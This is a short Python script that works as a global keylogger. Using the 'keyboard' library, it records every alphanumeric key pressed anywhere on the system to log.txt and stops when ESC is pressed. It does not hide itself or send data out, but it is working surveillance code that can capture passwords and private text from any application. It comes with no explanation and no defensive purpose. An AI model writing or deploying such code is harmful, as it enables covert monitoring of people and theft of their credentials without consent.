import keyboard

with open("log.txt", "a") as f:
    print("Global key logger started. Press ESC to quit.")

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == "esc":
                print("Exiting...")
                break
            if event.name.isalnum():
                f.write(event.name)
                f.flush()
                print(f"Saved: {event.name}")
